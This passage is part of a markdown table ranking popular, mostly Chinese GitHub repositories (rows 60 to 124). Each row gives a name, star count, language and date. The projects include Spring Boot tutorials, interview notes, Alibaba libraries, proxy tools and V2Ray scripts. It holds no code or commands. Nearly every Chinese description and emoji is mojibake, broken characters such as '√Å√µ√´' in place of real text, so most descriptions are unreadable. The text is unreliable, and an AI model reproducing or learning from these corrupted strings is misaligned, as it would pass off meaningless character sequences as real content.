actuator(ÁõëÊéß)„ÄÅadmin(ÂèØËßÜÂåñÁõëÊéß)„ÄÅlogback(Êó•Âøó)„ÄÅaopLog(ÈÄöËøáAOPËÆ∞ÂΩïwebËØ∑Ê±ÇÊó•Âøó)„ÄÅÁªü‰∏ÄÂºÇÂ∏∏Â§ÑÁêÜ(jsonÁ∫ßÂà´ÂíåÈ°µÈù¢Á∫ßÂà´)„ÄÅfreemarker(Ê®°ÊùøÂºïÊìé)„ÄÅthymeleaf(Ê®°ÊùøÂºïÊìé)„ÄÅBeetl(Ê®°ÊùøÂºïÊìé)„ÄÅEnjoy(Ê®°ÊùøÂºïÊìé)„ÄÅJdbcTemplate(ÈÄöÁî®JDBCÊìç‰ΩúÊï∞ÊçÆÂ∫ì)„ÄÅJPA(Âº∫Â§ßÁöÑORMÊ°ÜÊû∂)„ÄÅmybatis(Âº∫Â§ßÁöÑORMÊ°ÜÊû∂)„ÄÅÈÄöÁî®Mapper(Âø´ÈÄüÊìç‰ΩúMybati ...|18.6k|Java|10/27|
|60|[YMFE/yapi](https://github.com/YMFE/yapi)|YApi ÊòØ‰∏Ä‰∏™ÂèØÊú¨Âú∞ÈÉ®ÁΩ≤ÁöÑ„ÄÅÊâìÈÄöÂâçÂêéÁ´ØÂèäQAÁöÑ„ÄÅÂèØËßÜÂåñÁöÑÊé•Âè£ÁÆ°ÁêÜÂπ≥Âè∞|18.3k|JavaScript|10/26|
|61|[komeiji-satori/Dress](https://github.com/komeiji-satori/Dress)|Â•ΩËÄ∂  ÊòØÂ•≥Ë£Ö|18.3k|Standard ML|10/29|
|62|[hollischuang/toBeTopJavaer](https://github.com/hollischuang/toBeTopJavaer)|To Be Top Javaer - JavaÂ∑•Á®ãÂ∏àÊàêÁ•û‰πãË∑Ø|17.9k|Java|10/25|
|63|[davideuler/architecture.of.internet-product](https://github.com/davideuler/architecture.of.internet-product)|‰∫íËÅîÁΩëÂÖ¨Âè∏ÊäÄÊúØÊû∂ÊûÑÔºåÂæÆ‰ø°/Ê∑òÂÆù/ÂæÆÂçö/ËÖæËÆØ/ÈòøÈáå/ÁæéÂõ¢ÁÇπËØÑ/ÁôæÂ∫¶/Google/Facebook/Amazon/eBayÁöÑÊû∂ÊûÑÔºåÊ¨¢ËøéPRË°•ÂÖÖ|17.9k|-|10/24|
|64|[Binaryify/NeteaseCloudMusicApi](https://github.com/Binaryify/NeteaseCloudMusicApi)|ÁΩëÊòì‰∫ëÈü≥‰πê Node.js API service|17.5k|JavaScript|10/29|
|65|[TeamStuQ/skill-map](https://github.com/TeamStuQ/skill-map)|Á®ãÂ∫èÂëòÊäÄËÉΩÂõæË∞±|17.4k|HTML|08/28|
|66|[alibaba/easyexcel](https://github.com/alibaba/easyexcel)|Âø´ÈÄü„ÄÅÁÆÄÂçïÈÅøÂÖçOOMÁöÑjavaÂ§ÑÁêÜExcelÂ∑•ÂÖ∑|17.4k|Java|10/27|
|67|[zhaoolee/ChromeAppHeroes](https://github.com/zhaoolee/ChromeAppHeroes)|üåàË∞∑Á≤í-ChromeÊèí‰ª∂Ëã±ÈõÑÊ¶ú, ‰∏∫‰ºòÁßÄÁöÑChromeÊèí‰ª∂ÂÜô‰∏ÄÊú¨‰∏≠ÊñáËØ¥Êòé‰π¶, ËÆ©ChromeÊèí‰ª∂Ëã±ÈõÑ‰ª¨ÈÄ†Á¶è‰∫∫Á±ª~  ChromePluginHeroes, Write a Chinese manual for the excellent Chrome plugin, let the Chrome plugin heroes benefit the human~ ÂÖ¨‰ºóÂè∑„Äå0Âä†1„ÄçÂêåÊ≠•Êõ¥Êñ∞|17.2k|JavaScript|10/26|
|68|[qiurunze123/miaosha](https://github.com/qiurunze123/miaosha)|‚≠ê‚≠ê‚≠ê‚≠êÁßíÊùÄÁ≥ªÁªüËÆæËÆ°‰∏éÂÆûÁé∞.‰∫íËÅîÁΩëÂ∑•Á®ãÂ∏àËøõÈò∂‰∏éÂàÜÊûêüôãüêì|17.2k|Java|10/19|
|69|[wuyouzhuguli/SpringAll](https://github.com/wuyouzhuguli/SpringAll)|Âæ™Â∫èÊ∏êËøõÔºåÂ≠¶‰π†Spring Boot„ÄÅSpring Boot & Shiro„ÄÅSpring Batch„ÄÅSpring Cloud„ÄÅSpring Cloud Alibaba„ÄÅSpring Security & Spring Security OAuth2ÔºåÂçöÂÆ¢SpringÁ≥ªÂàóÊ∫êÁ†ÅÔºöhttps://mrbird.cc|17.1k|Java|05/13|
|70|[halo-dev/halo](https://github.com/halo-dev/halo)|‚úç  An excellent open source blog publishing application.   ‰∏Ä‰∏™‰ºòÁßÄÁöÑÂºÄÊ∫êÂçöÂÆ¢ÂèëÂ∏ÉÂ∫îÁî®„ÄÇ|17.1k|Java|10/30|
|71|[wangzheng0822/algo](https://github.com/wangzheng0822/algo)|Êï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ïÂøÖÁü•ÂøÖ‰ºöÁöÑ50‰∏™‰ª£Á†ÅÂÆûÁé∞|16.9k|Python|10/29|
|72|[zhangdaiscott/jeecg-boot](https://github.com/zhangdaiscott/jeecg-boot)|Âü∫‰∫é‰ª£Á†ÅÁîüÊàêÂô®ÁöÑ‰Ωé‰ª£Á†ÅÂπ≥Âè∞ÔºåË∂ÖË∂ä‰º†ÁªüÂïÜ‰∏öÂπ≥Âè∞ÔºÅÂâçÂêéÁ´ØÂàÜÁ¶ªÊû∂ÊûÑÔºöSpringBoot 2.xÔºåSpringCloud AlibabaÔºåAnt Design&VueÔºåMybatis-plusÔºåShiroÔºåJWT„ÄÇÂº∫Â§ßÁöÑ‰ª£Á†ÅÁîüÊàêÂô®ËÆ©ÂâçÂêéÁ´Ø‰ª£Á†Å‰∏ÄÈîÆÁîüÊàêÔºåÊó†ÈúÄÂÜô‰ªª‰Ωï‰ª£Á†Å! ÂºïÈ¢ÜÊñ∞ÂºÄÂèëÊ®°Âºè(OnlineCoding-> ‰ª£Á†ÅÁîüÊàê-> ÊâãÂ∑•MERGE)ÔºåÂ∏ÆÂä©JavaÈ°πÁõÆËß£ÂÜ≥70%ÈáçÂ§çÂ∑•‰ΩúÔºåËÆ©ÂºÄÂèëÊõ¥ÂÖ≥Ê≥®‰∏öÂä°ÈÄªËæëÔºåÊó¢ËÉΩÂø´ÈÄüÊèêÈ´òÂºÄÂèëÊïàÁéáÔºåÂ∏ÆÂä©ÂÖ¨Âè∏ËäÇÁúÅÊàêÊú¨ÔºåÂêåÊó∂Âèà‰∏çÂ§±ÁÅµÊ¥ªÊÄß„ÄÇ|16.8k|Java|10/29|
|73|[judasn/IntelliJ-IDEA-Tutorial](https://github.com/judasn/IntelliJ-IDEA-Tutorial)|IntelliJ IDEA ÁÆÄ‰Ωì‰∏≠Êñá‰∏ìÈ¢òÊïôÁ®ã|16.8k|-|10/12|
|74|[wenyan-lang/wenyan](https://github.com/wenyan-lang/wenyan)|ÊñáË®ÄÊñáÁ∑®Á®ãË™ûË®Ä A programming language for the ancient Chinese.|16.7k|TypeScript|08/09|
|75|[alibaba/canal](https://github.com/alibaba/canal)|ÈòøÈáåÂ∑¥Â∑¥ MySQL binlog Â¢ûÈáèËÆ¢ÈòÖ&Ê∂àË¥πÁªÑ‰ª∂ |16.3k|Java|10/29|
|76|[reactnativecn/react-native-guide](https://github.com/reactnativecn/react-native-guide)|React NativeÊåáÂçóÊ±áÈõÜ‰∫ÜÂêÑÁ±ªreact-nativeÂ≠¶‰π†ËµÑÊ∫ê„ÄÅÂºÄÊ∫êAppÂíåÁªÑ‰ª∂|16.2k|-|07/27|
|77|[xuxueli/xxl-job](https://github.com/xuxueli/xxl-job)|A distributed task scheduling framework.ÔºàÂàÜÂ∏ÉÂºè‰ªªÂä°Ë∞ÉÂ∫¶Âπ≥Âè∞XXL-JOBÔºâ|16.1k|Java|10/29|
|78|[1c7/chinese-independent-developer](https://github.com/1c7/chinese-independent-developer)|üë©üèø‚Äçüíªüë®üèæ‚Äçüíªüë©üèº‚Äçüíªüë®üèΩ‚Äçüíªüë©üèª‚Äçüíª‰∏≠ÂõΩÁã¨Á´ãÂºÄÂèëËÄÖÈ°πÁõÆÂàóË°® -- ÂàÜ‰∫´Â§ßÂÆ∂ÈÉΩÂú®ÂÅö‰ªÄ‰πà|16.0k|-|10/28|
|79|[alsotang/node-lessons](https://github.com/alsotang/node-lessons)|:closed_book:„ÄäNode.js ÂåÖÊïô‰∏çÂåÖ‰ºö„Äã by alsotang|16.0k|JavaScript|06/10|
|80|[MLEveryday/100-Days-Of-ML-Code](https://github.com/MLEveryday/100-Days-Of-ML-Code)|100-Days-Of-ML-Code‰∏≠ÊñáÁâà|15.9k|Jupyter Notebook|02/18|
|81|[didi/DoraemonKit](https://github.com/didi/DoraemonKit)|A full-featured App (iOS & Android) development assistant. You deserve it.  ÁÆÄÁß∞ ""DoKit"" „ÄÇ‰∏ÄÊ¨æÂäüËÉΩÈΩêÂÖ®ÁöÑÂÆ¢Êà∑Á´ØÔºà iOS „ÄÅAndroid„ÄÅÂæÆ‰ø°Â∞èÁ®ãÂ∫è ÔºâÁ†îÂèëÂä©ÊâãÔºå‰Ω†ÂÄºÂæóÊã•Êúâ„ÄÇhttps://www.dokit.cn/|15.8k|Java|10/29|
|82|[Awesome-HarmonyOS/HarmonyOS](https://github.com/Awesome-HarmonyOS/HarmonyOS)|A curated list of awesome things related to HarmonyOS. Âçé‰∏∫È∏øËíôÊìç‰ΩúÁ≥ªÁªü„ÄÇ|15.8k|C|09/15|
|83|[alibaba/ice](https://github.com/alibaba/ice)|üöÄ  Simple and friendly front-end development systemÔºàÈ£ûÂÜ∞ÔºåÁÆÄÂçïËÄåÂèãÂ•ΩÁöÑÂâçÁ´ØÁ†îÂèë‰ΩìÁ≥ª Ôºâhttps://ice.work/|15.8k|JavaScript|10/29|
|84|[shuzheng/zheng](https://github.com/shuzheng/zheng)|Âü∫‰∫éSpring+SpringMVC+MybatisÂàÜÂ∏ÉÂºèÊïèÊç∑ÂºÄÂèëÁ≥ªÁªüÊû∂ÊûÑÔºåÊèê‰æõÊï¥Â•óÂÖ¨ÂÖ±ÂæÆÊúçÂä°ÊúçÂä°Ê®°ÂùóÔºöÈõÜ‰∏≠ÊùÉÈôêÁÆ°ÁêÜÔºàÂçïÁÇπÁôªÂΩïÔºâ„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÊîØ‰ªò‰∏≠ÂøÉ„ÄÅÁî®Êà∑ÁÆ°ÁêÜÔºàÊîØÊåÅÁ¨¨‰∏âÊñπÁôªÂΩïÔºâ„ÄÅÂæÆ‰ø°Âπ≥Âè∞„ÄÅÂ≠òÂÇ®Á≥ªÁªü„ÄÅÈÖçÁΩÆ‰∏≠ÂøÉ„ÄÅÊó•ÂøóÂàÜÊûê„ÄÅ‰ªªÂä°ÂíåÈÄöÁü•Á≠âÔºåÊîØÊåÅÊúçÂä°Ê≤ªÁêÜ„ÄÅÁõëÊéßÂíåËøΩË∏™ÔºåÂä™Âäõ‰∏∫‰∏≠Â∞èÂûã‰ºÅ‰∏öÊâìÈÄ†ÂÖ®Êñπ‰ΩçJ2EE‰ºÅ‰∏öÁ∫ßÂºÄÂèëËß£ÂÜ≥ÊñπÊ°à„ÄÇ|15.7k|Java|10/13|
|85|[datawhalechina/pumpkin-book](https://github.com/datawhalechina/pumpkin-book)|„ÄäÊú∫Âô®Â≠¶‰π†„ÄãÔºàË•øÁìú‰π¶ÔºâÂÖ¨ÂºèÊé®ÂØºËß£ÊûêÔºåÂú®Á∫øÈòÖËØªÂú∞ÂùÄÔºöhttps://datawhalechina.github.io/pumpkin-book|15.4k|-|10/27|
|86|[PKUanonym/REKCARC-TSC-UHT](https://github.com/PKUanonym/REKCARC-TSC-UHT)|Ê∏ÖÂçéÂ§ßÂ≠¶ËÆ°ÁÆóÊú∫Á≥ªËØæÁ®ãÊîªÁï• Guidance for courses in Department of Computer Science and Technology, Tsinghua University|15.3k|HTML|10/16|
|87|[huihut/interview](https://github.com/huihut/interview)|üìö C/C++ ÊäÄÊúØÈù¢ËØïÂü∫Á°ÄÁü•ËØÜÊÄªÁªìÔºåÂåÖÊã¨ËØ≠Ë®Ä„ÄÅÁ®ãÂ∫èÂ∫ì„ÄÅÊï∞ÊçÆÁªìÊûÑ„ÄÅÁÆóÊ≥ï„ÄÅÁ≥ªÁªü„ÄÅÁΩëÁªú„ÄÅÈìæÊé•Ë£ÖËΩΩÂ∫ìÁ≠âÁü•ËØÜÂèäÈù¢ËØïÁªèÈ™å„ÄÅÊãõËÅò„ÄÅÂÜÖÊé®Á≠â‰ø°ÊÅØ„ÄÇThis repository is a summary of the basic knowledge of recruiting job seekers and beginners in the direction of C/C++ technology, including language, program library, data structure, algorithm, system, network, link loading library, in ...|15.2k|C++|10/12|
|88|[chaozh/awesome-blockchain-cn](https://github.com/chaozh/awesome-blockchain-cn)|Êî∂ÈõÜÊâÄÊúâÂå∫ÂùóÈìæ(BlockChain)ÊäÄÊúØÂºÄÂèëÁõ∏ÂÖ≥ËµÑÊñôÔºåÂåÖÊã¨FabricÂíåEthereumÂºÄÂèëËµÑÊñô|15.1k|JavaScript|05/29|
|89|[CarGuo/GSYVideoPlayer](https://github.com/CarGuo/GSYVideoPlayer)|ËßÜÈ¢ëÊí≠ÊîæÂô®ÔºàIJKplayer„ÄÅExoPlayer„ÄÅMediaPlayerÔºâÔºåHTTPSÔºåÊîØÊåÅÂºπÂπïÔºåÂ§ñÊåÇÂ≠óÂπïÔºåÊîØÊåÅÊª§Èïú„ÄÅÊ∞¥Âç∞„ÄÅgifÊà™ÂõæÔºåÁâáÂ§¥ÂπøÂëä„ÄÅ‰∏≠Èó¥ÂπøÂëäÔºåÂ§ö‰∏™ÂêåÊó∂Êí≠ÊîæÔºåÊîØÊåÅÂü∫Êú¨ÁöÑÊãñÂä®ÔºåÂ£∞Èü≥„ÄÅ‰∫ÆÂ∫¶Ë∞ÉËäÇÔºåÊîØÊåÅËæπÊí≠ËæπÁºìÂ≠òÔºåÊîØÊåÅËßÜÈ¢ëËá™Â∏¶rotationÁöÑÊóãËΩ¨Ôºà90,270‰πãÁ±ªÔºâÔºåÈáçÂäõÊóãËΩ¨‰∏éÊâãÂä®ÊóãËΩ¨ÁöÑÂêåÊ≠•ÊîØÊåÅÔºåÊîØÊåÅÂàóË°®Êí≠Êîæ ÔºåÂàóË°®ÂÖ®Â±èÂä®ÁîªÔºåËßÜÈ¢ëÂä†ËΩΩÈÄüÂ∫¶ÔºåÂàóË°®Â∞èÁ™óÂè£ÊîØÊåÅÊãñÂä®ÔºåÂä®ÁîªÊïàÊûúÔºåË∞ÉÊï¥ÊØî‰æãÔºåÂ§öÂàÜËæ®ÁéáÂàáÊç¢ÔºåÊîØÊåÅÂàáÊç¢Êí≠ÊîæÂô®ÔºåËøõÂ∫¶Êù°Â∞èÁ™óÂè£È¢ÑËßàÔºåÂàóË°®ÂàáÊç¢ËØ¶ÊÉÖÈ°µÈù¢Êó†ÁºùÊí≠ÊîæÔºårtsp„ÄÅconcat„ÄÅmpeg„ÄÇ |15.1k|Java|10/26|
|90|[LingCoder/OnJava8](https://github.com/LingCoder/OnJava8)|„ÄäOn Java 8„Äã‰∏≠ÊñáÁâàÔºåÂèàÂêç„ÄäJavaÁºñÁ®ãÊÄùÊÉ≥„Äã Á¨¨5Áâà |14.6k|-|10/27|
|91|[hzlzh/Best-App](https://github.com/hzlzh/Best-App)|Êî∂ÈõÜ&Êé®Ëçê‰ºòÁßÄÁöÑ Apps/Á°¨‰ª∂/ÊäÄÂ∑ß/Âë®ËæπÁ≠â|14.6k|-|05/15|
|92|[linlinjava/litemall](https://github.com/linlinjava/litemall)|Âèà‰∏Ä‰∏™Â∞èÂïÜÂüé„ÄÇlitemall = Spring BootÂêéÁ´Ø + VueÁÆ°ÁêÜÂëòÂâçÁ´Ø + ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÁî®Êà∑ÂâçÁ´Ø + VueÁî®Êà∑ÁßªÂä®Á´Ø|14.5k|Java|10/28|
|93|[jaywcjlove/linux-command](https://github.com/jaywcjlove/linux-command)|LinuxÂëΩ‰ª§Â§ßÂÖ®ÊêúÁ¥¢Â∑•ÂÖ∑ÔºåÂÜÖÂÆπÂåÖÂê´LinuxÂëΩ‰ª§ÊâãÂÜå„ÄÅËØ¶Ëß£„ÄÅÂ≠¶‰π†„ÄÅÊêúÈõÜ„ÄÇhttps://git.io/linux|14.5k|HTML|10/29|
|94|[dianping/cat](https://github.com/dianping/cat)|CAT ‰Ωú‰∏∫ÊúçÂä°Á´ØÈ°πÁõÆÂü∫Á°ÄÁªÑ‰ª∂ÔºåÊèê‰æõ‰∫Ü Java, C/C++, Node.js, Python, Go Á≠âÂ§öËØ≠Ë®ÄÂÆ¢Êà∑Á´ØÔºåÂ∑≤ÁªèÂú®ÁæéÂõ¢ÁÇπËØÑÁöÑÂü∫Á°ÄÊû∂ÊûÑ‰∏≠Èó¥‰ª∂Ê°ÜÊû∂ÔºàMVCÊ°ÜÊû∂ÔºåRPCÊ°ÜÊû∂ÔºåÊï∞ÊçÆÂ∫ìÊ°ÜÊû∂ÔºåÁºìÂ≠òÊ°ÜÊû∂Á≠âÔºåÊ∂àÊÅØÈòüÂàóÔºåÈÖçÁΩÆÁ≥ªÁªüÁ≠âÔºâÊ∑±Â∫¶ÈõÜÊàêÔºå‰∏∫ÁæéÂõ¢ÁÇπËØÑÂêÑ‰∏öÂä°Á∫øÊèê‰æõÁ≥ªÁªü‰∏∞ÂØåÁöÑÊÄßËÉΩÊåáÊ†á„ÄÅÂÅ•Â∫∑Áä∂ÂÜµ„ÄÅÂÆûÊó∂ÂëäË≠¶Á≠â„ÄÇ|14.4k|Java|10/13|
|95|[ehang-io/nps](https://github.com/ehang-io/nps)|‰∏ÄÊ¨æËΩªÈáèÁ∫ß„ÄÅÈ´òÊÄßËÉΩ„ÄÅÂäüËÉΩÂº∫Â§ßÁöÑÂÜÖÁΩëÁ©øÈÄè‰ª£ÁêÜÊúçÂä°Âô®„ÄÇÊîØÊåÅtcp„ÄÅudp„ÄÅsocks5„ÄÅhttpÁ≠âÂá†‰πéÊâÄÊúâÊµÅÈáèËΩ¨ÂèëÔºåÂèØÁî®Êù•ËÆøÈóÆÂÜÖÁΩëÁΩëÁ´ô„ÄÅÊú¨Âú∞ÊîØ‰ªòÊé•Âè£Ë∞ÉËØï„ÄÅsshËÆøÈóÆ„ÄÅËøúÁ®ãÊ°åÈù¢ÔºåÂÜÖÁΩëdnsËß£Êûê„ÄÅÂÜÖÁΩësocks5‰ª£ÁêÜÁ≠âÁ≠â‚Ä¶‚Ä¶ÔºåÂπ∂Â∏¶ÊúâÂäüËÉΩÂº∫Â§ßÁöÑwebÁÆ°ÁêÜÁ´Ø„ÄÇa lightweight, high-performance, powerful intranet penetration proxy server, with a powerful web management terminal.|14.4k|Go|10/24|
|96|[forezp/SpringCloudLearning](https://github.com/forezp/SpringCloudLearning)|„ÄäÂè≤‰∏äÊúÄÁÆÄÂçïÁöÑSpring CloudÊïôÁ®ãÊ∫êÁ†Å„Äã|14.4k|Java|06/10|
|97|[getlantern/download](https://github.com/getlantern/download)|LanternÂÆòÊñπÁâàÊú¨‰∏ãËΩΩ ËìùÁÅØ ÁøªÂ¢ô ‰ª£ÁêÜ ÁßëÂ≠¶‰∏äÁΩë Â§ñÁΩë Âä†ÈÄüÂô® Ê¢ØÂ≠ê Ë∑ØÁî± proxy vpn circumvention gfw|14.4k|-|08/15|
|98|[alibaba/Sentinel](https://github.com/alibaba/Sentinel)|A powerful flow control component enabling reliability, resilience and monitoring for microservices. (Èù¢Âêë‰∫ëÂéüÁîüÂæÆÊúçÂä°ÁöÑÈ´òÂèØÁî®ÊµÅÊéßÈò≤Êä§ÁªÑ‰ª∂)|14.2k|Java|10/29|
|99|[jumpserver/jumpserver](https://github.com/jumpserver/jumpserver)|JumpServer ÊòØÂÖ®ÁêÉÈ¶ñÊ¨æÂºÄÊ∫êÁöÑÂ†°ÂûíÊú∫ÔºåÊòØÁ¨¶Âêà 4A ÁöÑ‰∏ì‰∏öËøêÁª¥ÂÆâÂÖ®ÂÆ°ËÆ°Á≥ªÁªü„ÄÇ|14.2k|Python|10/29|
|100|[facert/awesome-spider](https://github.com/facert/awesome-spider)|Áà¨Ëô´ÈõÜÂêà|14.1k|-|08/06|
|101|[haizlin/fe-interview](https://github.com/haizlin/fe-interview)|ÂâçÁ´ØÈù¢ËØïÊØèÊó• 3+1Ôºå‰ª•Èù¢ËØïÈ¢òÊù•È©±Âä®Â≠¶‰π†ÔºåÊèêÂÄ°ÊØèÊó•Â≠¶‰π†‰∏éÊÄùËÄÉÔºåÊØèÂ§©ËøõÊ≠•‰∏ÄÁÇπÔºÅÊØèÂ§©Êó©‰∏ä5ÁÇπÁ∫ØÊâãÂ∑•ÂèëÂ∏ÉÈù¢ËØïÈ¢òÔºàÊ≠ªÁ£ïËá™Â∑±ÔºåÊÑâÊÇ¶Â§ßÂÆ∂ÔºâÔºå3000+ÈÅìÂâçÁ´ØÈù¢ËØïÈ¢òÂÖ®Èù¢Ë¶ÜÁõñÔºåHTML/CSS/JavaScript/Vue/React/Nodejs/TypeScript/ECMAScritpt/Webpack/Jquery/Â∞èÁ®ãÂ∫è/ËΩØÊäÄËÉΩ‚Ä¶‚Ä¶|14.0k|JavaScript|10/30|
|102|[ruanyf/weekly](https://github.com/ruanyf/weekly)|ÁßëÊäÄÁà±Â•ΩËÄÖÂë®ÂàäÔºåÊØèÂë®‰∫îÂèëÂ∏É|14.0k|-|10/23|
|103|[wangshub/wechat_jump_game](https://github.com/wangshub/wechat_jump_game)|ÂæÆ‰ø°„ÄäË∑≥‰∏ÄË∑≥„ÄãPython ËæÖÂä©|13.9k|Python|10/10|
|104|[chai2010/advanced-go-programming-book](https://github.com/chai2010/advanced-go-programming-book)|:books: „ÄäGoËØ≠Ë®ÄÈ´òÁ∫ßÁºñÁ®ã„ÄãÂºÄÊ∫êÂõæ‰π¶ÔºåÊ∂µÁõñCGO„ÄÅGoÊ±áÁºñËØ≠Ë®Ä„ÄÅRPCÂÆûÁé∞„ÄÅProtobufÊèí‰ª∂ÂÆûÁé∞„ÄÅWebÊ°ÜÊû∂ÂÆûÁé∞„ÄÅÂàÜÂ∏ÉÂºèÁ≥ªÁªüÁ≠âÈ´òÈò∂‰∏ªÈ¢ò(ÂÆåÁ®ø)|13.8k|Go|10/20|
|105|[youzan/vant-weapp](https://github.com/youzan/vant-weapp)|ËΩªÈáè„ÄÅÂèØÈù†ÁöÑÂ∞èÁ®ãÂ∫è UI ÁªÑ‰ª∂Â∫ì|13.7k|JavaScript|10/15|
|106|[JeffLi1993/springboot-learning-example](https://github.com/JeffLi1993/springboot-learning-example)|spring boot ÂÆûË∑µÂ≠¶‰π†Ê°à‰æãÔºåÊòØ spring boot ÂàùÂ≠¶ËÄÖÂèäÊ†∏ÂøÉÊäÄÊúØÂ∑©Âõ∫ÁöÑÊúÄ‰Ω≥ÂÆûË∑µ„ÄÇÂè¶Â§ñÂÜôÂçöÂÆ¢ÔºåÁî® OpenWrite„ÄÇ|13.6k|Java|10/13|
|107|[nndl/nndl.github.io](https://github.com/nndl/nndl.github.io)|„ÄäÁ•ûÁªèÁΩëÁªú‰∏éÊ∑±Â∫¶Â≠¶‰π†„Äã ÈÇ±Èî°ÈπèËëó Neural Network and Deep Learning |13.5k|HTML|10/22|
|108|[EastWorld/wechat-app-mall](https://github.com/EastWorld/wechat-app-mall)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂïÜÂüéÔºåÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂæÆÂ∫ó|13.4k|JavaScript|10/24|
|109|[taizilongxu/interview_python](https://github.com/taizilongxu/interview_python)|ÂÖ≥‰∫éPythonÁöÑÈù¢ËØïÈ¢ò|13.2k|Shell|08/03|
|110|[PaddlePaddle/Paddle](https://github.com/PaddlePaddle/Paddle)|PArallel Distributed Deep LEarning: Machine Learning Framework from Industrial Practice Ôºà„ÄéÈ£ûÊ°®„ÄèÊ†∏ÂøÉÊ°ÜÊû∂ÔºåÊ∑±Â∫¶Â≠¶‰π†&Êú∫Âô®Â≠¶‰π†È´òÊÄßËÉΩÂçïÊú∫„ÄÅÂàÜÂ∏ÉÂºèËÆ≠ÁªÉÂíåË∑®Âπ≥Âè∞ÈÉ®ÁΩ≤Ôºâ|13.2k|Python|10/30|
|111|[qianguyihao/Web](https://github.com/qianguyihao/Web)|ÂâçÁ´ØÂÖ•Èó®Âà∞ËøõÈò∂ÂõæÊñáÊïôÁ®ãÔºåË∂ÖËØ¶ÁªÜÁöÑWebÂâçÁ´ØÂ≠¶‰π†Á¨îËÆ∞„ÄÇ‰ªéÈõ∂ÂºÄÂßãÂ≠¶ÂâçÁ´ØÔºåÂÅö‰∏ÄÂêçÁ≤æËá¥‰ºòÈõÖÁöÑÂâçÁ´ØÂ∑•Á®ãÂ∏à„ÄÇÂÖ¨‰ºóÂè∑„ÄåÂçÉÂè§Â£πÂè∑„Äç‰ΩúËÄÖ„ÄÇ|13.1k|JavaScript|10/23|
|112|[vnpy/vnpy](https://github.com/vnpy/vnpy)|Âü∫‰∫éPythonÁöÑÂºÄÊ∫êÈáèÂåñ‰∫§ÊòìÂπ≥Âè∞ÂºÄÂèëÊ°ÜÊû∂|13.1k|C++|10/30|
|113|[233boy/v2ray](https://github.com/233boy/v2ray)|ÊúÄÂ•ΩÁî®ÁöÑ V2Ray ‰∏ÄÈîÆÂÆâË£ÖËÑöÊú¨ & ÁÆ°ÁêÜËÑöÊú¨|13.0k|Shell|09/15|
|114|[dcloudio/mui](https://github.com/dcloudio/mui)|ÊúÄÊé•ËøëÂéüÁîüAPP‰ΩìÈ™åÁöÑÈ´òÊÄßËÉΩÊ°ÜÊû∂|13.0k|JavaScript|07/30|
|115|[easychen/howto-make-more-money](https://github.com/easychen/howto-make-more-money)|Á®ãÂ∫èÂëòÂ¶Ç‰Ωï‰ºòÈõÖÁöÑÊå£Èõ∂Ëä±Èí±Ôºå2.0ÁâàÔºåÂçáÁ∫ß‰∏∫Â∞è‰π¶‰∫Ü„ÄÇMost of this not work outside China , so no English translate|12.9k|PHP|10/17|
|116|[ryanhanwu/How-To-Ask-Questions-The-Smart-Way](https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way)|Êú¨ÊñáÂéüÊñáÁî±Áü•Âêç Hacker Eric S. Raymond ÊâÄÊí∞ÂØ´ÔºåÊïô‰Ω†Â¶Ç‰ΩïÊ≠£Á¢∫ÁöÑÊèêÂá∫ÊäÄË°ìÂïèÈ°å‰∏¶Áç≤Âæó‰Ω†ÊªøÊÑèÁöÑÁ≠îÊ°à„ÄÇ|12.9k|JavaScript|10/25|
|117|[zergtant/pytorch-handbook](https://github.com/zergtant/pytorch-handbook)|pytorch handbookÊòØ‰∏ÄÊú¨ÂºÄÊ∫êÁöÑ‰π¶Á±çÔºåÁõÆÊ†áÊòØÂ∏ÆÂä©ÈÇ£‰∫õÂ∏åÊúõÂíå‰ΩøÁî®PyTorchËøõË°åÊ∑±Â∫¶Â≠¶‰π†ÂºÄÂèëÂíåÁ†îÁ©∂ÁöÑÊúãÂèãÂø´ÈÄüÂÖ•Èó®ÔºåÂÖ∂‰∏≠ÂåÖÂê´ÁöÑPytorchÊïôÁ®ãÂÖ®ÈÉ®ÈÄöËøáÊµãËØï‰øùËØÅÂèØ‰ª•ÊàêÂäüËøêË°å|12.8k|Jupyter Notebook|10/27|
|118|[fengdu78/lihang-code](https://github.com/fengdu78/lihang-code)|„ÄäÁªüËÆ°Â≠¶‰π†ÊñπÊ≥ï„ÄãÁöÑ‰ª£Á†ÅÂÆûÁé∞|12.8k|Jupyter Notebook|09/22|
|119|[alibaba/ARouter](https://github.com/alibaba/ARouter)|üí™ A framework for assisting in the renovation of Android componentization (Â∏ÆÂä© Android App ËøõË°åÁªÑ‰ª∂ÂåñÊîπÈÄ†ÁöÑË∑ØÁî±Ê°ÜÊû∂)|12.5k|Java|10/22|
|120|[Kr1s77/awesome-python-login-model](https://github.com/Kr1s77/awesome-python-login-model)|üòÆpythonÊ®°ÊãüÁôªÈôÜ‰∏Ä‰∫õÂ§ßÂûãÁΩëÁ´ôÔºåËøòÊúâ‰∏Ä‰∫õÁÆÄÂçïÁöÑÁà¨Ëô´ÔºåÂ∏åÊúõÂØπ‰Ω†‰ª¨ÊúâÊâÄÂ∏ÆÂä©‚ù§Ô∏èÔºåÂ¶ÇÊûúÂñúÊ¨¢ËÆ∞ÂæóÁªô‰∏™starÂì¶üåü|12.4k|Python|10/02|
|121|[Tencent/QMUI_Android](https://github.com/Tencent/QMUI_Android)|ÊèêÈ´ò Android UI ÂºÄÂèëÊïàÁéáÁöÑ UI Â∫ì|12.3k|Java|10/28|
|122|[dyc87112/SpringBoot-Learning](https://github.com/dyc87112/SpringBoot-Learning)|Spring BootÂü∫Á°ÄÊïôÁ®ãÔºåSpring Boot 2.xÁâàÊú¨ËøûËΩΩ‰∏≠ÔºÅÔºÅÔºÅ|12.3k|Java|09/11|
|123|[521xueweihan/git-tips](https://github.com/521xueweihan/git-tips)|:trollface:GitÁöÑÂ•áÊäÄÊ∑´Â∑ß|12.2k|-|04/14|
|124|[Bigkoo/Android-PickerView](https://github.com/Bigkoo/Android-PickerView)|This is a picker view for android , support linkage effect, timepicker and optionspicker.ÔºàÊó∂Èó¥ÈÄâÊã©Âô®„ÄÅÁúÅÂ∏ÇÂå∫‰∏âÁ∫ßËÅîÂä®Ôºâ|12.2k|Java|10/23|
